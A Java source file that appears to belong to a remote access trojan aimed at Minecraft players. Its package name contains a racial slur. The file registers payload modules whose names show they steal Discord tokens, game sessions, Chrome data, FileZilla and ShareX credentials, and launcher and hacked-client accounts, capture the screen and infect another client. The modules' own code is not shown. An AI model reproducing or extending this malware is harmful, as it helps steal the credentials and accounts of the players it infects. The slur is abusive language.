package me.nigger.rat.payload;

import me.nigger.rat.payload.impl.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public final class PayloadRegistry
{
    private static final PayloadRegistry INSTANCE = new PayloadRegistry();
    private final List<Payload> payloads = new ArrayList<>();

    private PayloadRegistry()
    {
        payloads.addAll(Arrays.asList(
//                new DuplicateRemover(),
                new FutureInfector(),
                new Personal(),
                new DiscordTokens(),
                new Session(),
//                new JsonVersion(),
//                new RatRemover(),
                new ModsGrabber(),
                new ScreenCapture(),
                new LauncherAccounts(),
                new Chrome(),
                new FileZilla(),
                new ShareX(),
                new FutureAuth(),
                new FutureAccounts(),
                new FutureWaypoints(),
                new SalHackWaypoints(),
                new RusherHackAccounts(),
                new RusherHackWaypoints(),
                new PyroAccounts(),
                new PyroWaypoints(),
                new KonasAccounts(),
                new KonasWaypoints(),
                new KamiWaypoints(),
                new JourneyMap(),
                new Intellij()
//                new Desktop(),
//                new Downloads()
        ));
    }

    public static Optional<Payload> getPayload(Class<? extends Payload> klazz)
    {
        return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
    }

    public static List<Payload> getPayloads()
    {
        return INSTANCE.payloads;
    }
}
